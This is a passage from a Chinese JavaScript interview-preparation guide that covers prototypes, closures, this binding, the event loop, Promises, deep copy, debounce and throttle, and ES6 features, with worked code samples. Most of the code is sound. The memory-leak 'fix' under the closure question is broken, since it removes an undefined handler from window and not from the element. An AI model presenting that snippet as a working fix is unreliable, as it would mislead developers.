  this.name = name
}

Person.prototype.sayHello = function() {
  console.log(`Hello, I'm ${this.name}`)
}

const alice = new Person('Alice')

// ===== 关系链 =====
alice.__proto__ === Person.prototype        // true  (实例 → 原型)
Person.prototype.constructor === Person     // true  (原型 → 构造函数)
Person.prototype.__proto__ === Object.prototype  // true (原型 → Object 原型)
Object.prototype.__proto__ === null         // true  (原型链终点)

// ⚠️ __proto__ 是非标准属性，推荐用 Object.getPrototypeOf()
Object.getPrototypeOf(alice) === Person.prototype // true

// ===== 属性查找过程（原型链）=====
alice.toString()
// 1. alice 自身查找 toString → ❌ 没有
// 2. alice.__proto__(Person.prototype) → ❌ 没有
// 3. Person.prototype.__proto__(Object.prototype) → ✅ 找到
// 4. 如果还没找到 → null → 返回 undefined
```

#### 手写 instanceof

```javascript
// instanceof 的本质：检查构造函数的 prototype 是否出现在实例的原型链上
function myInstanceof(instance, constructor) {
  let proto = Object.getPrototypeOf(instance)

  while (proto) {
    if (proto === constructor.prototype) return true
    proto = Object.getPrototypeOf(proto)
  }

  return false
}

myInstanceof([], Array)   // true
myInstanceof([], Object)  // true
myInstanceof({}, Array)   // false
```

#### 原型继承

```javascript
// 寄生组合继承（最优）
function Parent(name) {
  this.name = name
  this.colors = ['red', 'blue']
}
Parent.prototype.sayName = function() {
  console.log(this.name)
}

function Child(name, age) {
  Parent.call(this, name) // 继承属性
  this.age = age
}

// 继承方法（核心步骤）
Child.prototype = Object.create(Parent.prototype, {
  constructor: {
    value: Child,
    enumerable: false,
    writable: true,
    configurable: true
  }
})
// 等价于：
// Child.prototype = Object.create(Parent.prototype)
// Child.prototype.constructor = Child

const child = new Child('Bob', 10)
child.sayName()          // 'Bob'
console.log(child.colors) // ['red', 'blue']

// class 语法糖（底层还是原型链）
class Parent2 {
  constructor(name) { this.name = name }
  sayName() { console.log(this.name) }
}

class Child2 extends Parent2 {
  constructor(name, age) {
    super(name)
    this.age = age
  }
}
```

**面试要点：** 一定要画出三角关系图（构造函数↔原型↔实例），并且能手写 instanceof。

---

### 25. 闭包是什么？为什么会有内存泄漏？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 闭包：函数 + 它能访问的外部变量 =====
function createCounter() {
  let count = 0 // 这个变量不会被垃圾回收，因为 inner 函数引用它

  return function() {
    count++ // 闭包：访问了外部函数的变量
    return count
  }
}

const counter = createCounter()
console.log(counter()) // 1
console.log(counter()) // 2  ← count 变量「存活」在闭包中
console.log(counter()) // 3
```

#### 闭包的本质（用 Chrome DevTools 视角）

```javascript
// 每个函数都有 [[Scopes]] 内部属性
function outer() {
  const a = 1
  const b = 2

  return function inner() {
    console.log(a) // 只用了 a
    debugger       // 在此处打断点查看 [[Scopes]]
  }
}

// inner.[[Scopes]] 包含：
// └─ Closure (outer) { a: 1 }
//    └─ Script {...}
//       └─ Global {...}
// b 不在 Closure 中！V8 会智能地只保留被访问的变量
```

#### 经典面试题：循环中的闭包

```javascript
// ❌ 问题：全部输出 5
for (var i = 0; i < 5; i++) {
  setTimeout(() => console.log(i), 0)
}
// 输出: 5, 5, 5, 5, 5

// 原因：var 没有块级作用域，5 个回调共享同一个 i
// 执行时 i 已经变成 5

// ✅ 解决方式 1：let 块级作用域
for (let i = 0; i < 5; i++) {
  setTimeout(() => console.log(i), 0)
}
// 输出: 0, 1, 2, 3, 4

// ✅ 解决方式 2：IIFE 创建新作用域
for (var i = 0; i < 5; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 0)
  })(i)
}

// ✅ 解决方式 3：setTimeout 第三个参数传参
for (var i = 0; i < 5; i++) {
  setTimeout(console.log, 0, i)
}
```

#### 闭包的实际应用

```javascript
// 1. 数据私有化
function createBank() {
  let balance = 0  // 私有变量
  return {
    deposit(amount) { balance += amount },
    withdraw(amount) {
      if (amount > balance) throw new Error('余额不足')
      balance -= amount
    },
    getBalance() { return balance }
    // balance 只能通过暴露的方法访问
  }
}

// 2. 函数柯里化
const add = (a) => (b) => (c) => a + b + c
const add5 = add(5)
const add5and3 = add5(3)
console.log(add5and3(2)) // 10

// 3. 防抖节流
function debounce(fn, delay) {
  let timer = null // 闭包保存 timer
  return function(...args) {
    clearTimeout(timer)
    timer = setTimeout(() => fn.apply(this, args), delay)
  }
}

// 4. 高阶组件 / 组合式函数（所有依赖外部变量的函数工厂都是闭包）

// 5. 模块模式
const module = (function() {
  const privateVar = 'secret'
  return {
    getSecret: () => privateVar
  }
})()
```

#### 闭包与内存泄漏

```javascript
// ⚠️ 内存泄漏场景：闭包持有大对象引用不释放
function createLeak() {
  const largeData = new Array(1000000).fill('🐛')
  return function() {
    // 即使这里不用 largeData
    // V8 老版本会把整个 Closure 保留
    // 现代 V8 会智能 GC 未使用的变量
    console.log('hello')
  }
}

// ❌ 典型内存泄漏
function setupHandler() {
  const element = document.getElementById('btn')
  const hugeData = new Array(10000000).fill('data')

  element.addEventListener('click', function() {
    // 闭包引用了 hugeData 和 element
    console.log(hugeData[0])
  })
  // 即使移除 element，闭包仍然持有引用
}

// ✅ 修复
function setupHandler() {
  const element = document.getElementById('btn')
  const hugeData = new Array(10000000).fill('data')

  element.addEventListener('click', function() {
    console.log(hugeData[0])
  })

  // 不需要时手动清理
  window.removeEventListener('click', handler)
  // 或设置 weak ref
}
```

**面试要点：** 闭包 = 函数 + 外部变量引用。JavaScript 中所有函数本质上都是闭包。内存泄漏不是闭包本身的问题，而是引用管理不当。

---

### 26. this 指向问题：如何确定 this 的值？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// this 不是在定义时确定，而是在调用时确定
// 取诀于「谁调用、怎么调用」

// ===== 规则 1: 全局环境 =====
console.log(this) // window（浏览器）/ global（Node）
// 严格模式：undefined

// ===== 规则 2: 对象方法调用 =====
const obj = {
  name: 'Alice',
  sayHi() {
    console.log(this.name) // this → obj
  }
}
obj.sayHi() // 'Alice'

const fn = obj.sayHi
fn() // undefined（this → window/undefined，丢失了调用者）

// ===== 规则 3: 构造函数 (new) =====
function Person(name) {
  this.name = name // this → 新创建的实例
}
const p = new Person('Bob')

// ===== 规则 4: call / apply / bind =====
function greet(greeting) {
  console.log(`${greeting}, ${this.name}`)
}
const user = { name: 'Charlie' }
greet.call(user, 'Hi')     // 'Hi, Charlie'
greet.apply(user, ['Hey']) // 'Hey, Charlie'
const boundGreet = greet.bind(user)
boundGreet('Hello')         // 'Hello, Charlie'

// ===== 规则 5: 箭头函数 =====
// 箭头函数没有自己的 this，继承外层作用域的 this
const arrowObj = {
  name: 'Arrow',
  sayHi: () => {
    console.log(this.name) // this → 定义时的外层作用域（window/global）
  },
  regularFunc() {
    const arrow = () => console.log(this.name)
    arrow() // this → regularFunc 的 this → obj
  }
}
arrowObj.sayHi()       // undefined（window.name）
arrowObj.regularFunc() // 'Arrow'
```

#### 优先级（从高到低）

```javascript
// 1. new 绑定
// 2. 显式绑定（call/apply/bind）
// 3. 隐式绑定（对象方法调用）
// 4. 默认绑定

// ===== this 面试高频题 =====
const length = 10
function fn() {
  console.log(this.length)
}
const obj2 = {
  length: 5,
  method(fn) {
    fn()                    // ?
    arguments[0]()          // ?
    fn.call(this)           // ?
  }
}
obj2.method(fn, 1, 2, 3)

// 答案分析：
// fn() → this 是 window → window.length = 10
// arguments[0]() → this 是 arguments 对象 → arguments.length = 4
// fn.call(this) → this 绑定到 obj2 → 5
```

```javascript
// ===== 手写 call =====
Function.prototype.myCall = function(context, ...args) {
  // 处理 null/undefined
  context = context == null ? window : Object(context)
  // 用唯一 key 避免覆盖已有属性
  const fnKey = Symbol('fn')
  context[fnKey] = this  // this 是要调用的函数
  const result = context[fnKey](...args)
  delete context[fnKey]
  return result
}

// ===== 手写 apply =====
Function.prototype.myApply = function(context, args = []) {
  if (!Array.isArray(args)) {
    throw new TypeError('CreateListFromArrayLike called on non-object')
  }
  return this.myCall(context, ...args)
}

// ===== 手写 bind =====
Function.prototype.myBind = function(context, ...boundArgs) {
  const fn = this
  return function(...args) {
    // 如果是用 new 调用的，this instanceof fn → 用 this 而非 context
    return fn.apply(
      this instanceof fn ? this : context,
      [...boundArgs, ...args]
    )
  }
}
```

**面试要点：** 必须清楚 5 种绑定规则和优先级。手写 call/apply/bind 是高频手写题。

---

### 27. 什么是事件委托（事件代理）？

**⭐⭐⭐⭐ · 高频**

```javascript
// 问题：1000 个 li 元素，每个都需要绑定点击事件
// ❌ 差方案：给每个 li 绑定事件
document.querySelectorAll('li').forEach(li => {
  li.addEventListener('click', (e) => {
    console.log(li.textContent)
  })
})

// ✅ 好方案：事件委托 —— 事件绑定在父元素上
document.querySelector('ul').addEventListener('click', (e) => {
  // 利用事件冒泡，判断事件来源
  if (e.target.tagName === 'LI') {
    console.log(e.target.textContent)
  }
})
```

#### 原理：事件冒泡 + 事件捕获

```
捕获阶段          目标阶段          冒泡阶段
window → document → html → body → ul → li → ul → body → html → document → window
                                     ↑      ↑
                                   e.target 冒泡时父元素也能收到事件
```

```javascript
// 完整的事件委托封装
function delegate(parent, eventType, selector, handler) {
  parent.addEventListener(eventType, function(e) {
    // 从 e.target 向上查找匹配 selector 的元素
    let target = e.target
    while (target && target !== parent) {
      if (target.matches(selector)) {
        handler.call(target, e, target)
        return
      }
      target = target.parentNode
    }
  })
}

// 使用
delegate(document.getElementById('list'), 'click', 'li.active', (e, el) => {
  console.log('点击了激活的 li:', el.textContent)
})

// 事件委托的优势
// 1. 减少事件绑定数量（性能更好）
// 2. 动态添加的子元素自动拥有事件（无需重新绑定）
// 3. 更少的内存占用

// 注意事项
// ⚠️ focus/blur/scroll/mouseenter/mouseleave 不冒泡
// ⚠️ e.stopPropagation() 会阻止委托
// ⚠️ 需要判断 e.target 是否是目标元素
```

**面试要点：** 利用事件冒泡，把子元素的事件委托到父元素处理。核心优势：动态元素自动绑定、减少内存。

---

### 28. 什么是 Event Loop？宏任务和微任务的区别？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 浏览器 Event Loop =====
// 执行顺序：同步代码 → 微任务队列清空 → 一个宏任务 → 微任务队列清空 → 下一个宏任务...

console.log('1') // 同步

setTimeout(() => {
  console.log('2') // 宏任务
}, 0)

Promise.resolve().then(() => {
  console.log('3') // 微任务
})

console.log('4') // 同步

// 输出顺序：1 → 4 → 3 → 2
```

#### 任务分类

```
┌──────────────────────────────────────────────────┐
│                    调用栈 (Call Stack)            │
│  [ 执行同步代码 ]                                 │
│       │                                           │
│       ▼ 栈清空后                                   │
│  ┌─────────────────────┐                          │
│  │   微任务队列          │ ← 优先级最高             │
│  │   Promise.then/catch │   必须全部清空            │
│  │   MutationObserver   │   才能执行下一个宏任务     │
│  │   queueMicrotask     │                          │
│  └─────────────────────┘                          │
│       │                                           │
│       ▼ 微任务清空后                                │
│  ┌─────────────────────┐                          │
│  │   宏任务队列          │ ← 每次只取一个执行         │
│  │   setTimeout         │                           │
│  │   setInterval        │                           │
│  │   I/O                │                           │
│  │   UI 渲染            │                           │
│  │   requestAnimationFrame │                       │
│  │   script (整体代码)   │                           │
│  │   postMessage        │                           │
│  └─────────────────────┘                          │
└──────────────────────────────────────────────────┘
```

#### 经典面试题

```javascript
async function async1() {
  console.log('async1 start')
  await async2()
  console.log('async1 end') // await 后面的代码 = Promise.then 微任务
}

async function async2() {
  console.log('async2')
}

console.log('script start')

setTimeout(() => {
  console.log('setTimeout')
}, 0)

async1()

new Promise((resolve) => {
  console.log('promise1')
  resolve()
}).then(() => {
  console.log('promise2')
})

console.log('script end')

// 答案：
// script start
// async1 start
// async2
// promise1
// script end
// async1 end       ← 微任务
// promise2         ← 微任务
// setTimeout       ← 宏任务

// 解析过程：
// 1. 同步: script start → async1 start → async2 → promise1 → script end
// 2. 清空微任务: async1 end → promise2
// 3. 下一个宏任务: setTimeout
```

#### Node.js 的 Event Loop（进阶）

```javascript
// Node.js 有 6 个阶段，每个阶段有自己的 FIFO 队列
// ┌───────────────────────────┐
// │   timers (setTimeout)      │
// │   pending callbacks        │
// │   idle, prepare            │
// │   poll (I/O)               │
// │   check (setImmediate)     │
// │   close callbacks          │
// └───────────────────────────┘
// 每个阶段之间会清空微任务

// setImmediate vs setTimeout(fn, 0)
// 在 poll 阶段之后 → setImmediate 优先（通常在 setTimeout 之前）
// 在非 poll 阶段中 → setTimeout 优先（取决于执行上下文）
```

**面试要点：** 必须能画出执行顺序。记住口诀：「同步清完微任务，微任务清完取宏，取完宏再清微任务」。

---

### 29. new 操作符做了什么？手写 new

**⭐⭐⭐⭐ · 高频**

```javascript
// new 做了四件事：
// 1. 创建一个空对象
// 2. 将该对象的 __proto__ 指向构造函数的 prototype
// 3. 将 this 绑定到该对象，执行构造函数
// 4. 如果构造函数返回对象，则返回该对象；否则返回新创建的对象

function myNew(constructor, ...args) {
  // 1. 创建空对象，并关联原型
  const obj = Object.create(constructor.prototype)

  // 2. 执行构造函数，绑定 this
  const result = constructor.apply(obj, args)

  // 3. 如果构造函数返回了对象，返回该对象；否则返回 obj
  return (result !== null && typeof result === 'object') || typeof result === 'function'
    ? result
    : obj
}

// 测试
function Person(name, age) {
  this.name = name
  this.age = age
  // return { hacked: true } // 如果返回对象，new 会返回这个对象
}

const p1 = new Person('Alice', 25)
const p2 = myNew(Person, 'Alice', 25)
console.log(p1, p2) // 结果相同
console.log(p2 instanceof Person) // true
```

**面试要点：** 四点一步不能少，尤其是第四点——构造函数返回对象时的特殊处理，大多数人会忘记。

---

### 30. 深拷贝和浅拷贝的区别？如何实现深拷贝？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 浅拷贝：只复制第一层 =====
const obj = { a: 1, b: { c: 2 } }

// 方式 1: Object.assign
const shallow1 = Object.assign({}, obj)

// 方式 2: 展开运算符
const shallow2 = { ...obj }

// 方式 3: Array.slice
const arr = [1, [2, 3]]
const shallow3 = arr.slice()

// 验证
shallow1.b.c = 999
console.log(obj.b.c) // 999 ← 原对象也被修改了！
```

```javascript
// ===== 深拷贝：完全独立的新对象 =====

// 方式 1: JSON 方法（最简单但有限制）
const deepClone1 = (obj) => JSON.parse(JSON.stringify(obj))

// ❌ JSON 方式的限制
const special = {
  fn: function() {},    // → 丢失
  undef: undefined,     // → 丢失
  sym: Symbol('id'),    // → 丢失
  date: new Date(),     // → 变成字符串
  reg: /test/,          // → 变成空对象 {}
  bigint: 1n,           // → 报错！
  map: new Map(),       // → 变成空对象 {}
  set: new Set(),       // → 变成空对象 {}
  nan: NaN,             // → 变成 null
  infinity: Infinity,   // → 变成 null
  circular: null        // → 循环引用报错！
}

// 方式 2: 手写完整版深拷贝（面试高频手写题）
function deepClone(obj, map = new WeakMap()) {
  // null、undefined、基本类型直接返回
  if (obj === null || typeof obj !== 'object') return obj

  // 循环引用检测（用 WeakMap 避免内存泄漏）
  if (map.has(obj)) return map.get(obj)

  // 日期
  if (obj instanceof Date) return new Date(obj)

  // 正则
  if (obj instanceof RegExp) return new RegExp(obj.source, obj.flags)

  // Map
  if (obj instanceof Map) {
    const cloneMap = new Map()
    map.set(obj, cloneMap)
    obj.forEach((val, key) => {
      cloneMap.set(deepClone(key, map), deepClone(val, map))
    })
    return cloneMap
  }

  // Set
  if (obj instanceof Set) {
    const cloneSet = new Set()
    map.set(obj, cloneSet)
    obj.forEach(val => {
      cloneSet.add(deepClone(val, map))
    })
    return cloneSet
  }

  // 数组和普通对象
  const cloneObj = Array.isArray(obj) ? [] : {}
  map.set(obj, cloneObj)

  // 复制所有属性（包括 Symbol key）
  const keys = [...Object.keys(obj), ...Object.getOwnPropertySymbols(obj)]
  for (const key of keys) {
    cloneObj[key] = deepClone(obj[key], map)
  }

  return cloneObj
}

// 方式 3: structuredClone（现代浏览器原生方法 ⭐）
const clone = structuredClone(obj)
// ✅ 支持：循环引用、Date、RegExp、Map、Set、ArrayBuffer、Blob
// ❌ 不支持：函数、Symbol、DOM 节点、Error
```

| 方法 | 循环引用 | 函数 | Symbol | Date/RegExp | Map/Set |
|------|----------|------|--------|-------------|---------|
| JSON | ❌ | ❌ | ❌ | ❌ | ❌ |
| structuredClone | ✅ | ❌ | ✅ | ✅ | ✅ |
| lodash.cloneDeep | ✅ | ✅ | ✅ | ✅ | ✅ |
| 手写 | ✅ | ✅ | ✅ | ✅ | ✅ |

**面试要点：** 必须提到循环引用（WeakMap 解决）、特殊类型处理（Date/RegExp/Map/Set）、Symbol key。

---

### 31. 防抖 (Debounce) 和节流 (Throttle) 的区别及实现？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 防抖 Debounce =====
// 场景：搜索框输入、窗口 resize、表单验证
// 特点：持续触发时只执行最后一次，第一次触发后等待 N 秒

function debounce(fn, delay = 300, options = {}) {
  let timer = null
  const { leading = false } = options

  return function(...args) {
    // 首次触发立即执行
    if (leading && !timer) {
      fn.apply(this, args)
    }

    clearTimeout(timer)
    timer = setTimeout(() => {
      if (!leading) {
        fn.apply(this, args)
      }
      timer = null
    }, delay)
  }
}

// 使用
const searchInput = document.querySelector('#search')
searchInput.addEventListener('input', debounce((e) => {
  console.log('搜索:', e.target.value)
  // api.search(e.target.value)
}, 500))

// ===== 节流 Throttle =====
// 场景：滚动事件、鼠标移动、动画帧
// 特点：持续触发时固定时间间隔执行一次

function throttle(fn, delay = 300) {
  let lastTime = 0

  return function(...args) {
    const now = Date.now()
    if (now - lastTime >= delay) {
      fn.apply(this, args)
      lastTime = now
    }
  }
}

// 定时器版节流（确保最后一次也执行）
function throttle2(fn, delay = 300) {
  let timer = null

  return function(...args) {
    if (timer) return
    timer = setTimeout(() => {
      fn.apply(this, args)
      timer = null
    }, delay)
  }
}

// 使用
window.addEventListener('scroll', throttle(() => {
  console.log('滚动位置:', window.scrollY)
}, 200))

// ===== 对比 =====
// 防抖（电梯模式）：有人进来就重新计时，最后一个人进来 N 秒后关门
// 节流（水龙头模式）：无论水流多大，龙头每秒只滴 N 滴水

// 可视化
// 防抖: --触发-触发---触发---触发--→ [等待300ms] → 执行一次
// 节流: --触发-触发---触发---触发--→ 每300ms → 执行一次

// ===== requestAnimationFrame 版节流（动画专用）=====
function rafThrottle(fn) {
  let ticking = false
  return function(...args) {
    if (!ticking) {
      requestAnimationFrame(() => {
        fn.apply(this, args)
        ticking = false
      })
      ticking = true
    }
  }
}
```

```javascript
// 面试加分：手写一个完整版的防抖+节流
function debounceAndThrottle(fn, delay, mode = 'debounce') {
  let timer = null
  let lastTime = 0

  return function(...args) {
    if (mode === 'throttle') {
      const now = Date.now()
      if (now - lastTime >= delay) {
        fn.apply(this, args)
        lastTime = now
      }
    } else {
      clearTimeout(timer)
      timer = setTimeout(() => fn.apply(this, args), delay)
    }
  }
}
```

**面试要点：** 防抖是「等你停下来再做」，节流是「每隔一段时间做一次」。手写时必须注意 this 指向和参数传递。

---

### 32. call、apply、bind 的区别？

**⭐⭐⭐⭐ · 高频**

```javascript
const obj = { name: 'Alice' }

function greet(greeting, punctuation) {
  console.log(`${greeting}, ${this.name}${punctuation}`)
}

// call: 逐个传参，立即执行
greet.call(obj, 'Hello', '!')  // 'Hello, Alice!'

// apply: 数组传参，立即执行
greet.apply(obj, ['Hi', '!!']) // 'Hi, Alice!!'

// bind: 逐个传参，返回新函数（不立即执行）
const boundGreet = greet.bind(obj, 'Hey')
boundGreet('!!!')               // 'Hey, Alice!!!'

// ===== 应用场景 =====
// call: 借用方法
const max = Math.max.call(null, 1, 2, 3, 4, 5) // 5
// 或: Math.max.apply(null, [1, 2, 3, 4, 5])

// apply: 参数是数组时更方便
function sum() {
  return Array.prototype.reduce.apply(arguments, [(a, b) => a + b, 0])
}
console.log(sum(1, 2, 3)) // 6

// bind: React 类组件绑定 this，偏函数（柯里化）
const log = console.log.bind(console, '[LOG]')
log('test') // '[LOG] test'

// bind: 创建偏函数
const multiply = (a, b) => a * b
const double = multiply.bind(null, 2)
console.log(double(5)) // 10
```

**面试要点：** call/apply 立即执行，bind 返回函数。call 的参数逐个传，apply 用数组传。要能手写这三个方法。

---



## 五、ES6+ 新特性

### 33. var、let、const 的区别？暂时性死区是什么？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 核心区别 =====
// var: 函数作用域，变量提升，可重复声明，挂载到 window
// let: 块级作用域，无变量提升（有暂时性死区），不可重复声明
// const: 块级作用域，无变量提升，不可重复声明，不可重新赋值（引用类型属性可变）

// 1. 作用域
{
  var a = 1
  let b = 2
  const c = 3
}
console.log(a) // 1（var 没有块作用域）
console.log(b) // ReferenceError!
console.log(c) // ReferenceError!

// 2. 变量提升
console.log(x) // undefined（var 提升，但未初始化）
var x = 5

console.log(y) // ReferenceError: Cannot access 'y' before initialization
let y = 5       // 暂时性死区 (TDZ)

// 3. 重复声明
var a = 1
var a = 2 // ✅ 允许
let b = 1
let b = 2 // ❌ SyntaxError

// 4. 挂载到 window
var globalVar = 'hello'
console.log(window.globalVar) // 'hello'

let blockVar = 'world'
console.log(window.blockVar)  // undefined

// 5. const 不可重新赋值
const PI = 3.14
PI = 3     // ❌ TypeError

const arr = [1, 2, 3]
arr.push(4) // ✅ 可以修改内容
arr = [5, 6] // ❌ TypeError（重新赋值）

// ===== 暂时性死区 (TDZ) =====
// 从块开始到变量声明之前的区域，不能访问该变量
{
  // TDZ 开始
  // console.log(x) // ReferenceError
  // TDZ 继续
  let x = 1  // TDZ 结束
  console.log(x) // 1
}

// 为什么需要 TDZ？
// 1. 让编程更符合直觉——声明之前不可用
// 2. 避免 var 的许多 bug
// 3. const 必须在声明时就赋值

// ===== 经典面试题 =====
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0)
}
// 输出: 3, 3, 3（var 没有块作用域）

for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log(j), 0)
}
// 输出: 0, 1, 2（每次迭代都是新的块作用域）
// 相当于：
// {
//   let j = 0; setTimeout(() => console.log(j), 0)
// }
// {
//   let j = 1; setTimeout(() => console.log(j), 0)
// }
// {
//   let j = 2; setTimeout(() => console.log(j), 0)
// }
```

**面试要点：** 必说 TDZ。let 在 for 循环中的表现也是高频考点。

---

### 34. 箭头函数和普通函数的区别？

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== 核心区别 =====
// 1. 没有自己的 this —— 继承外层作用域
// 2. 没有 arguments 对象
// 3. 不能作为构造函数（不能用 new）
// 4. 没有 prototype 属性
// 5. 不能使用 yield（不能作为 Generator）

const obj = {
  name: 'Alice',

  // ❌ 箭头函数：this 继承外层（window/global）
  arrowSay: () => {
    console.log(this.name) // undefined
  },

  // ✅ 普通函数：this 指向调用者
  normalSay() {
    console.log(this.name) // 'Alice'
  },

  // ✅ 箭头函数作为回调（完美场景）
  delayedSay() {
    setTimeout(() => {
      console.log(this.name) // 'Alice' ← 继承 delayedSay 的 this
    }, 100)
  },

  // ❌ 普通函数作为回调（this 丢失）
  delayedSayBad() {
    setTimeout(function() {
      console.log(this.name) // undefined ← this 指向 window
    }, 100)
  }
}

// 不能 new 箭头函数
const Foo = () => {}
// new Foo() // TypeError: Foo is not a constructor

// 没有 arguments
const bar = () => {
  console.log(arguments) // ReferenceError
}
// 用 rest 参数代替
const bar2 = (...args) => {
  console.log(args) // [1, 2, 3]
}
bar2(1, 2, 3)

// 隐式返回
const add = (a, b) => a + b        // 单表达式直接返回
const getUser = () => ({ name: 'Alice' }) // 返回对象需要用括号包裹
const noop = () => {}               // 无返回值

// 不适合用箭头函数的场景
// 1. 对象方法（需要 this 指向对象本身）
// 2. 事件处理器（需要 this 指向目标元素时）
// 3. 原型方法
function Person(name) {
  this.name = name
}
Person.prototype.say = () => {
  console.log(this.name) // ❌ this 不是实例！
}
// 4. 动态上下文的回调
```

**面试要点：** 「没有自己的 this」是核心，说清楚之后其他限制都是这个原因的延伸。

---

### 35. Promise 的原理？手写 Promise.all / Promise.race / Promise.allSettled

**⭐⭐⭐⭐⭐ · 必问**

```javascript
// ===== Promise.all =====
// 全部成功才成功，一个失败就失败
Promise.myAll = function(promises) {
  return new Promise((resolve, reject) => {
    if (!Array.isArray(promises)) {
      return reject(new TypeError('Argument must be an array'))
    }

    const results = []
    let completed = 0
    const total = promises.length

    if (total === 0) return resolve([])

    promises.forEach((promise, index) => {
      // 包装非 Promise 值
      Promise.resolve(promise).then(
        (value) => {
          results[index] = value // 按顺序存储
          completed++
          if (completed === total) {
            resolve(results)
          }
        },
        (reason) => {
          reject(reason) // 一个失败，全部失败
        }
      )
    })
  })
}

// ===== Promise.race =====
// 第一个完成的（无论成功或失败）就是结果
Promise.myRace = function(promises) {
  return new Promise((resolve, reject) => {
    promises.forEach(promise => {
      Promise.resolve(promise).then(resolve, reject)
    })
  })
}

// ===== Promise.allSettled =====
// 等待全部完成，无论成功或失败
Promise.myAllSettled = function(promises) {
  return new Promise((resolve) => {
    const results = []
    let completed = 0
    const total = promises.length

    if (total === 0) return resolve([])

    const checkDone = () => {
      completed++
      if (completed === total) resolve(results)
    }

    promises.forEach((promise, index) => {
      Promise.resolve(promise).then(
        (value) => {
          results[index] = { status: 'fulfilled', value }
          checkDone()
        },
        (reason) => {
          results[index] = { status: 'rejected', reason }
          checkDone()
        }
      )
    })
  })
}

// ===== Promise.any =====
// 第一个成功的；全部失败才失败
Promise.myAny = function(promises) {
  return new Promise((resolve, reject) => {
    const errors = []
    let failed = 0
    const total = promises.length

    if (total === 0) return reject(new AggregateError([], 'All promises were rejected'))

    promises.forEach((promise, index) => {
      Promise.resolve(promise).then(resolve, (reason) => {
        errors[index] = reason
        failed++
        if (failed === total) {
          reject(new AggregateError(errors, 'All promises were rejected'))
        }
      })
    })
  })
}
```

#### Promise 的状态转换

```javascript
// Promise 有三种状态：
// pending → fulfilled (resolved)
// pending → rejected
// 状态一旦改变就不可逆转

// ===== Promise 链式调用原理 =====
// .then/.catch 都返回新的 Promise，实现链式调用
Promise.resolve(1)
  .then(v => v + 1)    // 返回 2，包装为 Promise.resolve(2)
  .then(v => v * 2)    // 返回 4
  .then(v => {
    console.log(v)     // 4
    throw new Error('出错了')
  })
  .catch(err => {
    console.error(err) // Error: 出错了
    return '恢复'       // 返回正常值，链可以继续
  })
  .then(v => console.log(v)) // '恢复'

// ⚠️ 常见错误
// 1. 忘记 return，链式调用断开
// 2. .then 中返回的 Promise 会被自动展开
// 3. .catch 只捕获前面链中的错误，不捕获后面的
```

#### 控制并发

```javascript
// 面试加分题：限制并发请求数
async function asyncPool(limit, tasks, iteratorFn) {
  const ret = []
  const executing = new Set()

  for (const task of tasks) {
    const p = Promise.resolve().then(() => iteratorFn(task))
    ret.push(p)
    executing.add(p)

    const clean = () => executing.delete(p)
    p.then(clean, clean)

    if (executing.size >= limit) {
      await Promise.race(executing)
    }
  }

  return Promise.all(ret)
}

// 使用：最多 3 个并发
const urls = ['/api/1', '/api/2', '/api/3', '/api/4', '/api/5']
asyncPool(3, urls, url => fetch(url).then(r => r.json()))
```

**面试要点：** Promise.all 要处理非 Promise 值（Promise.resolve 包装）、空数组、按顺序存结果。控制并发（asyncPool）是高级面试题。

---

### 36. async/await 的原理？和 Generator 有什么关系？

**⭐⭐⭐⭐**

```javascript
// async/await 是 Generator + 自动执行器的语法糖
// async 函数返回 Promise
// await 会暂停函数执行，等待 Promise 解决后继续

async function fetchUser(id) {
  const response = await fetch(`/api/users/${id}`)
  //      ↑ 这里暂停，等 fetch 返回后再继续
  const data = await response.json()
  return data
  // 等价于：
  // return Promise.resolve(fetch(`/api/users/${id}`))
  //   .then(response => response.json())
}

// ===== async/await 本质 =====
// 用 Generator 模拟 async/await
function* genFetchUser(id) {
  const response = yield fetch(`/api/users/${id}`)
  const data = yield response.json()
  return data
}

// 自动执行器（co 库的简化版）
function asyncToGenerator(generatorFunc) {
  return function(...args) {
    const gen = generatorFunc.apply(this, args)

    return new Promise((resolve, reject) => {
      function step(key, arg) {
        let result
        try {
          result = gen[key](arg) // gen.next(arg) 或 gen.throw(err)
        } catch (err) {
          return reject(err)
        }

        const { value, done } = result
        if (done) {
          return resolve(value)
        }
        // 把 yield 的值包装为 Promise
        Promise.resolve(value).then(
          val => step('next', val),
          err => step('throw', err)
        )
      }

      step('next')
    })
  }
}

const fetchUserAsync = asyncToGenerator(genFetchUser)
fetchUserAsync(1).then(user => console.log(user))
```

#### 错误处理

```javascript
// try/catch 捕获 await 的错误
async function getData() {
  try {
    const data = await fetch('/api/data')
    const json = await data.json()
    return json
  } catch (err) {
    console.error('请求失败:', err)
    return null // 返回默认值
  }
}

// .catch 方式
async function getData2() {
  const data = await fetch('/api/data').catch(err => {
    console.error(err)
    return null
  })
}

// ===== 常见陷阱 =====
// 1. 串行执行（慢）
async function serial() {
  const user = await fetchUser(1)
  const posts = await fetchPosts(1) // 等 user 完成才开始
  return { user, posts }
}

// 2. 并行执行（快）⭐
async function parallel() {
  const [user, posts] = await Promise.all([
    fetchUser(1),
    fetchPosts(1)
  ])
  return { user, posts }
}

// 3. forEach 中不能使用 async/await（不会等待）
// ❌ 错误
[1, 2, 3].forEach(async (id) => {
  await fetchUser(id) // 不等待！
})

// ✅ 正确
for (const id of [1, 2, 3]) {
  await fetchUser(id) // 串行等待
}

// ✅ 或并行
await Promise.all([1, 2, 3].map(id => fetchUser(id)))
```

**面试要点：** async/await 本质上就是 Generator + Promise 自动执行器。说清这个关系就是高级水平的体现。

---

### 37. ES6 模块化：CommonJS 和 ESM 的区别？

**⭐⭐⭐⭐ · 高频**

```javascript
// ===== CommonJS (Node.js 默认，同步) =====
// 导出
// moduleA.js
let count = 0
const addCount = () => { count++ }
module.exports = {
  count,
  addCount
}
// 或
exports.count = count
exports.addCount = addCount

// 导入
// main.js
const { count, addCount } = require('./moduleA')
console.log(count) // 0
addCount()
console.log(count) // 0  ← count 是值拷贝，不会变！

// ⚠️ CommonJS 是值的拷贝
